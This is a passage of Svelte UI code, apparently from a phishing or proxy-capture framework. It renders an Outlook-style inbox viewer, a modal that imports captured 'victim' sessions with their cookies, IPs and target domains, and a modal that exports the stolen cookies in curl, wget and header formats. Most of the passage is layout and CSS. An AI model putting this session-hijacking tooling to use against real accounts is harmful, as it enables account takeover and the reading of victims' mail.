							class="owa-msg-row {msg.isRead ? '' : 'unread'} {currentMessage && currentMessage.id === msg.id ? 'selected' : ''} {owaHighlightIndex === i ? 'kbd-highlight' : ''}"
							on:click={() => { owaHighlightIndex = i; openMessage(msg.id); }}
						>
							{#if !msg.isRead}
								<div class="owa-unread-bar" style="background-color: {owaThemes[owaTheme]?.accent || '#0078d4'}"></div>
							{:else}
								<div class="owa-unread-bar" style="background: transparent"></div>
							{/if}
							<div class="owa-msg-avatar" style="background-color: {getAvatarColor(msg.fromName || msg.from)}">
								{getInitials(msg.fromName || msg.from || '?')}
							</div>
							<div class="owa-msg-content">
								<div class="owa-msg-top">
									<span class="owa-msg-sender" class:font-semibold={!msg.isRead}>{msg.fromName || msg.from || 'Unknown'}</span>
									<span class="owa-msg-time">{formatShortDate(msg.date)}</span>
								</div>
								<div class="owa-msg-subject" class:font-semibold={!msg.isRead}>{msg.subject || '(no subject)'}</div>
								<div class="owa-msg-preview">{msg.preview || ''}</div>
							</div>
							{#if msg.hasAttachments}
								<svg class="owa-msg-attach" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"/></svg>
							{/if}
						</button>
					{/each}

					<!-- Pagination -->
					<div class="owa-pagination">
						<span class="owa-page-info">
							{#if inboxSearchActive && inboxSearch.trim()}
								{visibleInboxMessages.length} match{visibleInboxMessages.length === 1 ? '' : 'es'} (filtered from {inboxMessages.length})
							{:else}
								{inboxSkip + 1}-{inboxSkip + inboxMessages.length}
								{#if inboxTotalCount > 0} of {inboxTotalCount}{/if}
							{/if}
						</span>
						<button class="owa-page-btn" on:click={prevInboxPage} disabled={inboxSkip === 0 || (inboxSearchActive && !!inboxSearch.trim())}>
							<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
						</button>
						<button class="owa-page-btn" on:click={nextInboxPage} disabled={inboxMessages.length < inboxLimit || (inboxSearchActive && !!inboxSearch.trim())}>
							<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>
						</button>
					</div>
				{/if}
				{#if inboxLoading && inboxMessages.length > 0}
					<div class="owa-loading-bar" style="background-color: {owaThemes[owaTheme]?.accent || '#0078d4'}"></div>
				{/if}
			</div>
		</div>

		<!-- Reading Pane -->
		<div class="owa-reading-pane">
			{#if messageLoading}
				<div class="flex flex-col items-center justify-center h-full">
					<div class="owa-spinner"></div>
					<p class="text-sm mt-3" style="color: {owaTheme === 'dark' ? '#9ca3af' : '#6b7280'}">Loading message...</p>
				</div>
			{:else if currentMessage}
				<!-- Message Action Bar -->
				<div class="owa-reading-actions">
					<button class="owa-action-btn" on:click={() => openReplyModal(currentMessage)} title="Reply">
						<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6"/></svg>
						Reply
					</button>
					<button class="owa-action-btn" on:click={() => openReplyAllModal(currentMessage)} title="Reply All">
						<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h10a8 8 0 018 8v2M3 10l6 6m-6-6l6-6"/></svg>
						Reply all
					</button>
					<button class="owa-action-btn" on:click={() => openForwardModal(currentMessage)} title="Forward">
						<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 10h-10a8 8 0 00-8 8v2M21 10l-6 6m6-6l-6-6"/></svg>
						Forward
					</button>
					<div class="flex-1"></div>
					<button class="owa-action-btn" title="More actions">
						<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></svg>
					</button>
				</div>

				<!-- Message Header -->
				<div class="owa-reading-header">
					<h2 class="owa-reading-subject">{currentMessage.subject || '(no subject)'}</h2>
					<div class="flex items-start gap-3 mt-4">
						<div class="owa-msg-avatar" style="background-color: {getAvatarColor(currentMessage.fromName || currentMessage.from)}; width: 40px; height: 40px; font-size: 0.85rem;">
							{getInitials(currentMessage.fromName || currentMessage.from || '?')}
						</div>
						<div class="flex-1 min-w-0">
							<div class="flex items-baseline gap-2">
								<span class="font-semibold text-sm" style="color: {owaTheme === 'dark' ? '#e5e7eb' : '#1f2937'}">{currentMessage.fromName || 'Unknown'}</span>
								<span class="text-xs" style="color: {owaTheme === 'dark' ? '#6b7280' : '#9ca3af'}">&lt;{currentMessage.from || ''}&gt;</span>
							</div>
							{#if currentMessage.to && currentMessage.to.length > 0}
								<div class="text-xs mt-1" style="color: {owaTheme === 'dark' ? '#6b7280' : '#9ca3af'}">
									To: {currentMessage.to.join(', ')}
								</div>
							{/if}
						</div>
						<div class="text-xs flex-shrink-0" style="color: {owaTheme === 'dark' ? '#6b7280' : '#9ca3af'}">
							{formatDate(currentMessage.date)}
						</div>
					</div>
				</div>

				<!-- Attachments -->
				{#if currentMessage.attachments && currentMessage.attachments.length > 0}
					<div class="owa-reading-attachments">
						{#each currentMessage.attachments as att}
							<div class="owa-attachment-chip">
								<svg class="w-4 h-4 flex-shrink-0" style="color: {owaTheme === 'dark' ? '#6b7280' : '#9ca3af'}" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
								<span class="text-sm truncate">{att.name || 'Attachment'}</span>
								{#if att.size}<span class="text-xs opacity-50">{formatFileSize(att.size)}</span>{/if}
							</div>
						{/each}
					</div>
				{/if}

				<!-- Message Body -->
				<div class="owa-reading-body">
					{#if currentMessage.bodyHTML}
						<iframe
							srcdoc={currentMessage.bodyHTML}
							class="owa-body-iframe"
							sandbox="allow-same-origin"
							title="Email Content"
						></iframe>
					{:else}
						<pre class="whitespace-pre-wrap text-sm leading-relaxed" style="color: {owaTheme === 'dark' ? '#d1d5db' : '#374151'}">{currentMessage.bodyText || ''}</pre>
					{/if}
				</div>
			{:else}
				<!-- Empty state: no message selected -->
				<div class="flex flex-col items-center justify-center h-full">
					<svg class="w-24 h-24 mb-4" style="color: {owaTheme === 'dark' ? '#1e293b' : '#e5e7eb'}" fill="none" stroke="currentColor" viewBox="0 0 24 24">
						<rect x="2" y="4" width="20" height="16" rx="2" stroke-width="1"/>
						<path d="M22 7l-10 7L2 7" stroke-width="1"/>
					</svg>
					<p class="text-lg font-light" style="color: {owaTheme === 'dark' ? '#4b5563' : '#9ca3af'}">Select an item to read</p>
					<p class="text-sm mt-1" style="color: {owaTheme === 'dark' ? '#374151' : '#d1d5db'}">Nothing is selected</p>
				</div>
			{/if}
		</div>

		<!-- Settings Panel (slide-in from right) -->
		{#if owaShowSettings}
		<div class="owa-settings-panel">
			<div class="owa-settings-header">
				<h3 class="text-base font-semibold" style="color: {owaTheme === 'dark' ? '#e5e7eb' : '#1f2937'}">Settings</h3>
				<button class="owa-settings-close" on:click={() => (owaShowSettings = false)}>
					<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
				</button>
			</div>

			<div class="owa-settings-body">
				<!-- Theme Section -->
				<div class="owa-settings-section">
					<h4 class="owa-settings-label">Theme</h4>
					<div class="owa-theme-grid">
						{#each Object.entries(owaThemes) as [themeId, theme]}
							<button
								class="owa-theme-swatch {owaTheme === themeId ? 'active' : ''}"
								style="background: {theme.headerBg};"
								on:click={() => setOWATheme(themeId)}
								title={theme.name}
							>
								{#if owaTheme === themeId}
									<svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
								{/if}
							</button>
						{/each}
					</div>
				</div>

				<!-- Background Image Section -->
				<div class="owa-settings-section">
					<h4 class="owa-settings-label">Background</h4>
					<div class="owa-bg-grid">
						{#each owaBgImages as bg}
							<button
								class="owa-bg-swatch {owaBgImage === bg.id ? 'active' : ''}"
								style="background: {bg.id === 'none' ? (owaTheme === 'dark' ? '#1a1a1a' : '#f0f0f0') : bg.css};"
								on:click={() => setOWABgImage(bg.id)}
								title={bg.name}
							>
								{#if owaBgImage === bg.id}
									<svg class="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
								{/if}
								<span class="owa-bg-label">{bg.name}</span>
							</button>
						{/each}
					</div>
				</div>

				<!-- Account Info -->
				<div class="owa-settings-section">
					<h4 class="owa-settings-label">Account</h4>
					<div class="owa-account-card">
						<div class="owa-msg-avatar" style="background-color: {getAvatarColor(inboxStoreName)}; width: 36px; height: 36px; font-size: 0.8rem;">
							{getInitials(inboxStoreName)}
						</div>
						<div class="min-w-0">
							<div class="text-sm font-medium truncate" style="color: {owaTheme === 'dark' ? '#e5e7eb' : '#1f2937'}">{inboxStoreName}</div>
							{#if inboxStoreEmail}
								<div class="text-xs truncate" style="color: {owaTheme === 'dark' ? '#6b7280' : '#9ca3af'}">{inboxStoreEmail}</div>
							{/if}
						</div>
					</div>
				</div>
			</div>
		</div>
		{/if}
	</div>
</div>
{/if}

<!-- Import from Proxy Captures Modal -->
<Modal
	headerText="Import from Proxy Captures"
	visible={isProxyCaptureModalVisible}
	onClose={closeProxyCaptureModal}
>
	{#if proxyCapturesLoading}
		<div class="text-center py-8 opacity-60">Loading proxy captures...</div>
	{:else if proxyCaptures.length === 0}
		<div class="text-center py-8 opacity-60">No proxy captures with cookies found</div>
	{:else}
		<div class="mb-4 mt-4">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Name (optional)</label>
			<input
				type="text"
				class="w-full px-3 py-2 rounded-md border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800 text-gray-900 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-cta-blue"
				placeholder="e.g., Victim Session"
				bind:value={proxyCaptureImportName}
			/>
		</div>
		<div class="space-y-2 max-h-[50vh] overflow-y-auto">
			{#each proxyCaptures as capture}
				<button
					class="w-full text-left p-3 rounded-lg border transition-colors cursor-pointer
						{selectedCapture && selectedCapture.ID === capture.ID
							? 'bg-blue-50 dark:bg-blue-900/20 border-blue-400 dark:border-blue-600'
							: 'bg-white dark:bg-gray-800 border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700/50'}"
					on:click={() => (selectedCapture = capture)}
				>
					<div class="flex justify-between items-start">
						<div class="flex-1 min-w-0">
							<div class="flex items-center gap-2">
								{#if selectedCapture && selectedCapture.ID === capture.ID}
									<span class="w-3 h-3 rounded-full bg-blue-500 flex-shrink-0"></span>
								{/if}
								<span class="font-medium text-sm">
									{capture.Username || capture.IPAddress || 'Unknown'}
								</span>
								{#if capture.TargetDomain}
									<span class="badge badge-info">{capture.TargetDomain}</span>
								{/if}
							</div>
							<div class="text-xs opacity-60 mt-1">
								IP: {capture.IPAddress || 'N/A'}
								{#if capture.Cookies}
									| Cookies: {(() => { try { return JSON.parse(capture.Cookies).length; } catch { return '?'; } })()}
								{/if}
							</div>
						</div>
						<div class="text-xs opacity-50 flex-shrink-0 ml-2">
							{formatDate(capture.CreatedAt)}
						</div>
					</div>
				</button>
			{/each}
		</div>
		<div class="flex justify-end gap-2 mt-4 mb-4">
			<button
				class="px-4 py-2 rounded-md text-sm bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
				on:click={closeProxyCaptureModal}
			>
				Cancel
			</button>
			<button
				class="px-4 py-2 rounded-md text-sm bg-cta-blue text-white hover:opacity-80 transition-colors disabled:opacity-50"
				on:click={handleProxyCaptureImport}
				disabled={!selectedCapture}
			>
				Import Selected Capture
			</button>
		</div>
	{/if}
</Modal>

<!-- Delete Alert -->
{#if isDeleteAlertVisible}
	<DeleteAlert
		name={deleteValues.name}
		isVisible={isDeleteAlertVisible}
		onClick={handleDelete}
		on:close={() => (isDeleteAlertVisible = false)}
	/>
{/if}

<style>
	/* Dropdown items */
	.dropdown-item {
		display: flex;
		align-items: center;
		width: 100%;
		padding: 0.5rem 1rem;
		text-align: left;
		border: none;
		background: none;
		cursor: pointer;
		font-size: 0.875rem;
		color: var(--text-primary, #333);
	}
	.dropdown-item:hover {
		background: var(--bg-hover, #f0f0f0);
	}
	.dropdown-item-danger {
		color: rgb(220, 38, 38);
	}
	.dropdown-item-danger:hover {
		background: rgba(239, 68, 68, 0.1);
	}

	/* Badges */
	.badge {
		display: inline-flex;
		align-items: center;
		padding: 0.15rem 0.5rem;
		border-radius: 9999px;
		font-size: 0.7rem;
		font-weight: 600;
		text-transform: uppercase;
		letter-spacing: 0.025em;
	}
	.badge-success { background-color: rgba(34, 197, 94, 0.15); color: rgb(22, 163, 74); }
	.badge-error { background-color: rgba(239, 68, 68, 0.15); color: rgb(220, 38, 38); }
	.badge-warning { background-color: rgba(234, 179, 8, 0.15); color: rgb(202, 138, 4); }
	.badge-info { background-color: rgba(59, 130, 246, 0.15); color: rgb(37, 99, 235); }
	.badge-purple { background-color: rgba(147, 51, 234, 0.15); color: rgb(126, 34, 206); }
	.badge-default { background-color: rgba(107, 114, 128, 0.15); color: rgb(75, 85, 99); }
	:global(.dark) .badge-success { color: rgb(74, 222, 128); }
	:global(.dark) .badge-error { color: rgb(248, 113, 113); }
	:global(.dark) .badge-warning { color: rgb(250, 204, 21); }
	:global(.dark) .badge-info { color: rgb(96, 165, 250); }
	:global(.dark) .badge-purple { color: rgb(192, 132, 252); }
	:global(.dark) .badge-default { color: rgb(156, 163, 175); }

	/* ===== OWA FULLSCREEN LAYOUT ===== */
	.owa-fullscreen {
		position: fixed;
		top: 0; left: 0; right: 0; bottom: 0;
		z-index: 9999;
		display: flex;
		flex-direction: column;
		background: #f5f5f5;
		font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
	}
	.owa-fullscreen.owa-dark { background: #1a1a1a; }

	/* Header */
	.owa-header {
		display: flex;
		align-items: center;
		height: 48px;
		padding: 0 12px;
		flex-shrink: 0;
		gap: 8px;
	}
	.owa-header-left { display: flex; align-items: center; gap: 8px; }
	.owa-header-center { flex: 1; display: flex; justify-content: center; max-width: 600px; margin: 0 auto; }
	.owa-header-right { display: flex; align-items: center; gap: 4px; }
	.owa-header-btn {
		display: flex; align-items: center; justify-content: center;
		width: 36px; height: 36px; border-radius: 4px;
		border: none; background: transparent; color: white;
		cursor: pointer; transition: background 0.15s;
	}
	.owa-fullscreen:not(.owa-dark) .owa-header-btn { color: white; }
	.owa-header-btn:hover { background: rgba(255,255,255,0.15); }
	.owa-header-btn:disabled { opacity: 0.5; cursor: not-allowed; }
	.owa-logo { display: flex; align-items: center; gap: 6px; }
	.owa-logo-text { font-size: 1rem; font-weight: 600; letter-spacing: -0.01em; }
	.owa-search-bar {
		display: flex; align-items: center; gap: 8px;
		background: rgba(255,255,255,0.95); border-radius: 4px;
		padding: 6px 12px; width: 100%; max-width: 500px;
	}
	.owa-dark .owa-search-bar { background: rgba(50,50,50,0.9); }
	.owa-search-input {
		border: none; background: transparent; outline: none;
		flex: 1; font-size: 0.875rem; color: #333;
	}
	.owa-dark .owa-search-input { color: #e5e7eb; }
	.owa-user-avatar {
		width: 32px; height: 32px; border-radius: 50%;
		display: flex; align-items: center; justify-content: center;
		color: white; font-size: 0.75rem; font-weight: 600;
		cursor: pointer;
	}

	/* Body layout */
	.owa-body {
		display: flex; flex: 1; overflow: hidden;
	}

	/* App Rail */
	.owa-app-rail {
		width: 48px; flex-shrink: 0;
		background: white; border-right: 1px solid #edebe9;
		display: flex; flex-direction: column; align-items: center;
		padding-top: 8px; gap: 2px;
	}
	.owa-dark .owa-app-rail { background: #252525; border-color: #333; }
	.owa-rail-btn {
		width: 40px; height: 40px; border-radius: 4px;
		border: none; border-left: 3px solid transparent;
		background: transparent; cursor: pointer;
		display: flex; align-items: center; justify-content: center;
		transition: all 0.15s; color: #605e5c;
	}
	.owa-dark .owa-rail-btn { color: #a0a0a0; }
	.owa-rail-btn:hover { background: #f3f2f1; }
	.owa-dark .owa-rail-btn:hover { background: #333; }
	.owa-rail-btn.active { background: #f3f2f1; color: #0078d4; }
	.owa-dark .owa-rail-btn.active { background: rgba(0,120,212,0.15); color: #60a5fa; }
	.owa-rail-icon { width: 20px; height: 20px; display: flex; }

	/* Folder Sidebar */
	.owa-sidebar {
		width: 220px; flex-shrink: 0;
		background: #faf9f8; border-right: 1px solid #edebe9;
		padding: 12px 8px; overflow-y: auto;
	}
	.owa-dark .owa-sidebar { background: #1e1e1e; border-color: #333; }
	.owa-compose-btn {
		display: flex; align-items: center; gap: 8px;
		width: calc(100% - 8px); margin: 0 4px 12px;
		padding: 8px 16px; border-radius: 4px;
		border: none; color: white; font-size: 0.875rem;
		font-weight: 600; cursor: pointer;
		transition: filter 0.15s;
	}
	.owa-compose-btn:hover { filter: brightness(1.1); }
	.owa-folder-list { display: flex; flex-direction: column; gap: 1px; }
	.owa-folder-btn {
		display: flex; align-items: center; gap: 10px;
		width: 100%; padding: 8px 12px;
		border-radius: 4px; border: none; border-left: 3px solid transparent;
		background: transparent; color: #323130;
		font-size: 0.8125rem; cursor: pointer;
		transition: all 0.12s; text-align: left;
	}
	.owa-dark .owa-folder-btn { color: #c8c6c4; }
	.owa-folder-btn:hover { background: #f3f2f1; }
	.owa-dark .owa-folder-btn:hover { background: #2a2a2a; }
	.owa-folder-btn.active { font-weight: 600; border-radius: 0 4px 4px 0; }
	.owa-folder-btn:disabled { opacity: 0.5; }
	.owa-folder-icon { display: flex; flex-shrink: 0; opacity: 0.7; }
	.owa-folder-btn.active .owa-folder-icon { opacity: 1; }
	.owa-folder-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
	.owa-folder-count { font-size: 0.75rem; font-weight: 600; flex-shrink: 0; }

	/* Message List Panel */
	.owa-message-list-panel {
		width: 360px; flex-shrink: 0;
		background: white; border-right: 1px solid #edebe9;
		display: flex; flex-direction: column; overflow: hidden;
	}
	.owa-dark .owa-message-list-panel { background: #1e1e1e; border-color: #333; }

	/* Focused/Other Tabs */
	.owa-tabs {
		display: flex; align-items: center;
		padding: 0 16px; border-bottom: 1px solid #edebe9;
		flex-shrink: 0; height: 40px;
	}
	.owa-dark .owa-tabs { border-color: #333; }
	.owa-tab {
		padding: 8px 16px; border: none; background: transparent;
		font-size: 0.8125rem; color: #605e5c; cursor: pointer;
		border-bottom: 2px solid transparent;
		transition: all 0.15s; font-weight: 500;
	}
	.owa-dark .owa-tab { color: #a0a0a0; }
	.owa-tab.active { font-weight: 600; }
	.owa-tab:hover { color: #323130; }
	.owa-dark .owa-tab:hover { color: #e5e7eb; }
	.owa-tab-filter {
		margin-left: auto; color: #605e5c; cursor: pointer;
		padding: 4px; border-radius: 4px;
	}
	.owa-dark .owa-tab-filter { color: #a0a0a0; }
	.owa-tab-filter:hover { background: #f3f2f1; }

	/* Messages scroll */
	.owa-messages-scroll {
		flex: 1; overflow-y: auto; position: relative;
	}

	/* Message Row */
	.owa-msg-row {
		display: flex; align-items: flex-start; gap: 10px;
		width: 100%; padding: 12px 16px;
		border: none; background: transparent;
		cursor: pointer; text-align: left;
		transition: background 0.1s;
		border-bottom: 1px solid #f3f2f1;
	}
	.owa-dark .owa-msg-row { border-color: #2a2a2a; }
	.owa-msg-row:hover { background: #f5f5f5; }
	.owa-dark .owa-msg-row:hover { background: #2a2a2a; }
	.owa-msg-row.selected { background: #e6f2ff; }
	.owa-dark .owa-msg-row.selected { background: rgba(0,120,212,0.15); }
	.owa-msg-row.unread { background: #fafafa; }
	.owa-dark .owa-msg-row.unread { background: #222; }
	.owa-msg-row.kbd-highlight {
		outline: 2px solid #0078d4;
		outline-offset: -2px;
	}
	.owa-dark .owa-msg-row.kbd-highlight { outline-color: #60a5fa; }

	.owa-unread-bar { width: 3px; min-height: 100%; border-radius: 2px; flex-shrink: 0; align-self: stretch; }
	.owa-msg-avatar {
		width: 36px; height: 36px; border-radius: 50%;
		display: flex; align-items: center; justify-content: center;
		color: white; font-size: 0.75rem; font-weight: 600;
		flex-shrink: 0;
	}
	.owa-msg-content { flex: 1; min-width: 0; }
	.owa-msg-top { display: flex; justify-content: space-between; align-items: baseline; gap: 8px; }
	.owa-msg-sender { font-size: 0.8125rem; color: #323130; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
	.owa-dark .owa-msg-sender { color: #e5e7eb; }
	.owa-msg-time { font-size: 0.6875rem; color: #a19f9d; flex-shrink: 0; }
	.owa-dark .owa-msg-time { color: #6b7280; }
	.owa-msg-subject { font-size: 0.8125rem; color: #323130; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-top: 1px; }
	.owa-dark .owa-msg-subject { color: #d1d5db; }
	.owa-msg-preview { font-size: 0.75rem; color: #a19f9d; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-top: 2px; }
	.owa-dark .owa-msg-preview { color: #6b7280; }
	.owa-msg-attach { width: 14px; height: 14px; color: #a19f9d; flex-shrink: 0; margin-top: 4px; }

	/* Pagination */
	.owa-pagination {
		display: flex; align-items: center; justify-content: flex-end;
		gap: 4px; padding: 8px 16px;
		border-top: 1px solid #edebe9; flex-shrink: 0;
	}
	.owa-dark .owa-pagination { border-color: #333; }
	.owa-page-info { font-size: 0.75rem; color: #605e5c; margin-right: 8px; }
	.owa-dark .owa-page-info { color: #a0a0a0; }
	.owa-page-btn {
		width: 28px; height: 28px; border-radius: 4px;
		border: 1px solid #edebe9; background: white;
		color: #323130; cursor: pointer;
		display: flex; align-items: center; justify-content: center;
		transition: all 0.15s;
	}
	.owa-dark .owa-page-btn { background: #2a2a2a; border-color: #444; color: #e5e7eb; }
	.owa-page-btn:hover { background: #f3f2f1; }
	.owa-dark .owa-page-btn:hover { background: #333; }
	.owa-page-btn:disabled { opacity: 0.3; cursor: not-allowed; }

	/* Loading bar */
	.owa-loading-bar {
		position: absolute; top: 0; left: 0; right: 0;
		height: 2px; animation: owa-loading 1.5s ease-in-out infinite;
	}
	@keyframes owa-loading {
		0% { transform: translateX(-100%); }
		50% { transform: translateX(0); }
		100% { transform: translateX(100%); }
	}

	/* Spinner */
	.owa-spinner {
		width: 32px; height: 32px;
		border: 3px solid #edebe9; border-top-color: #0078d4;
		border-radius: 50%; animation: spin 0.8s linear infinite;
	}
	.owa-dark .owa-spinner { border-color: #333; border-top-color: #60a5fa; }
	@keyframes spin { to { transform: rotate(360deg); } }

	/* Reading Pane */
	.owa-reading-pane {
		flex: 1; display: flex; flex-direction: column;
		background: white; overflow: hidden;
	}
	.owa-dark .owa-reading-pane { background: #1e1e1e; }

	.owa-reading-actions {
		display: flex; align-items: center; gap: 2px;
		padding: 6px 16px; border-bottom: 1px solid #edebe9;
		flex-shrink: 0;
	}
	.owa-dark .owa-reading-actions { border-color: #333; }
	.owa-action-btn {
		display: inline-flex; align-items: center; gap: 4px;
		padding: 6px 10px; border-radius: 4px;
		border: none; background: transparent;
		color: #323130; font-size: 0.8125rem;
		cursor: pointer; transition: background 0.15s;
	}
	.owa-dark .owa-action-btn { color: #c8c6c4; }
	.owa-action-btn:hover { background: #f3f2f1; }
	.owa-dark .owa-action-btn:hover { background: #333; }

	.owa-reading-header {
		padding: 20px 24px; border-bottom: 1px solid #edebe9; flex-shrink: 0;
	}
	.owa-dark .owa-reading-header { border-color: #333; }
	.owa-reading-subject {
		font-size: 1.25rem; font-weight: 600; color: #323130;
	}
	.owa-dark .owa-reading-subject { color: #e5e7eb; }

	.owa-reading-attachments {
		padding: 12px 24px; border-bottom: 1px solid #edebe9;
		display: flex; flex-wrap: wrap; gap: 8px;
	}
	.owa-dark .owa-reading-attachments { border-color: #333; }
	.owa-attachment-chip {
		display: inline-flex; align-items: center; gap: 6px;
		padding: 6px 12px; border: 1px solid #edebe9;
		border-radius: 4px; background: #faf9f8;
		cursor: pointer; transition: all 0.15s;
	}
	.owa-dark .owa-attachment-chip { background: #2a2a2a; border-color: #444; }
	.owa-attachment-chip:hover { background: #f3f2f1; }
	.owa-dark .owa-attachment-chip:hover { background: #333; }

	.owa-reading-body {
		flex: 1; overflow: auto; padding: 24px;
	}
	.owa-body-iframe {
		width: 100%; min-height: 500px; height: 100%;
		border: none; background: white; border-radius: 4px;
	}
	.owa-dark .owa-body-iframe { background: #1e1e1e; }

	/* Settings Panel */
	.owa-settings-panel {
		position: absolute; top: 0; right: 0; bottom: 0;
		width: 340px; background: white;
		box-shadow: -4px 0 12px rgba(0,0,0,0.1);
		z-index: 10; display: flex; flex-direction: column;
		overflow-y: auto;
	}
	.owa-dark .owa-settings-panel { background: #252525; box-shadow: -4px 0 12px rgba(0,0,0,0.3); }
	.owa-settings-header {
		display: flex; align-items: center; justify-content: space-between;
		padding: 16px 20px; border-bottom: 1px solid #edebe9; flex-shrink: 0;
	}
	.owa-dark .owa-settings-header { border-color: #333; }
	.owa-settings-close {
		width: 32px; height: 32px; border-radius: 4px;
		border: none; background: transparent;
		color: #605e5c; cursor: pointer;
		display: flex; align-items: center; justify-content: center;
	}
	.owa-dark .owa-settings-close { color: #a0a0a0; }
	.owa-settings-close:hover { background: #f3f2f1; }
	.owa-dark .owa-settings-close:hover { background: #333; }
	.owa-settings-body { padding: 16px 20px; flex: 1; overflow-y: auto; }
	.owa-settings-section { margin-bottom: 24px; }
	.owa-settings-label {
		font-size: 0.8125rem; font-weight: 600; color: #323130;
		margin-bottom: 12px;
	}
	.owa-dark .owa-settings-label { color: #e5e7eb; }

	/* Theme swatches */
	.owa-theme-grid {
		display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
	}
	.owa-theme-swatch {
		height: 40px; border-radius: 6px; border: 2px solid transparent;
		cursor: pointer; transition: all 0.15s;
		display: flex; align-items: center; justify-content: center;
	}
	.owa-theme-swatch:hover { transform: scale(1.05); }
	.owa-theme-swatch.active { border-color: white; box-shadow: 0 0 0 2px #0078d4; }

	/* Background swatches */
	.owa-bg-grid {
		display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px;
	}
	.owa-bg-swatch {
		height: 48px; border-radius: 6px; border: 2px solid transparent;
		cursor: pointer; transition: all 0.15s;
		display: flex; flex-direction: column; align-items: center; justify-content: center;
		position: relative; overflow: hidden;
	}
	.owa-bg-swatch:hover { transform: scale(1.05); }
	.owa-bg-swatch.active { border-color: #0078d4; box-shadow: 0 0 0 1px #0078d4; }
	.owa-bg-label {
		font-size: 0.5625rem; color: white; text-shadow: 0 1px 2px rgba(0,0,0,0.5);
		position: absolute; bottom: 2px; font-weight: 500;
	}

	/* Account card */
	.owa-account-card {
		display: flex; align-items: center; gap: 10px;
		padding: 12px; border-radius: 6px;
		background: #faf9f8; border: 1px solid #edebe9;
	}
	.owa-dark .owa-account-card { background: #2a2a2a; border-color: #444; }

	/* Responsive */
	@media (max-width: 1024px) {
		.owa-reading-pane { display: none; }
		.owa-message-list-panel { flex: 1; width: auto; border-right: none; }
	}
	@media (max-width: 768px) {
		.owa-app-rail { display: none; }
		.owa-sidebar { width: 56px; padding: 8px 4px; }
		.owa-folder-name { display: none; }
		.owa-folder-count { display: none; }
		.owa-compose-btn span { display: none; }
		.owa-compose-btn { justify-content: center; padding: 8px; }
		.owa-message-list-panel { width: auto; flex: 1; }
	}
</style>

<!-- Export Cookies Modal -->
{#if isExportModalVisible}
<Modal
	headerText="Export Cookies: {exportStoreName}"
	visible={isExportModalVisible}
	onClose={() => (isExportModalVisible = false)}
>
	<div class="p-6 space-y-4">
		<p class="text-sm text-gray-700 dark:text-gray-300">Choose the export format for the cookies:</p>
		<div class="grid grid-cols-2 gap-3">
			<button
				class="p-3 rounded-lg border-2 text-left transition-colors {exportFormat === 'json' ? 'border-blue-500 bg-blue-50 dark:bg-blue-900/30' : 'border-gray-200 dark:border-gray-700 hover:border-gray-300 dark:hover:border-gray-600'}"
				on:click={() => (exportFormat = 'json')}
			>
				<div class="font-medium text-sm">JSON</div>
				<div class="text-xs opacity-60">Browser extension format</div>
			</button>
			<button
				class="p-3 rounded-lg border-2 text-left transition-colors {exportFormat === 'netscape' ? 'border-blue-500 bg-blue-50 dark:bg-blue-900/30' : 'border-gray-200 dark:border-gray-700 hover:border-gray-300 dark:hover:border-gray-600'}"
				on:click={() => (exportFormat = 'netscape')}
			>
				<div class="font-medium text-sm">Netscape</div>
				<div class="text-xs opacity-60">curl / wget compatible</div>
			</button>
			<button
				class="p-3 rounded-lg border-2 text-left transition-colors {exportFormat === 'header' ? 'border-blue-500 bg-blue-50 dark:bg-blue-900/30' : 'border-gray-200 dark:border-gray-700 hover:border-gray-300 dark:hover:border-gray-600'}"
				on:click={() => (exportFormat = 'header')}
			>
				<div class="font-medium text-sm">Header</div>
				<div class="text-xs opacity-60">Cookie: header string</div>
			</button>
			<button
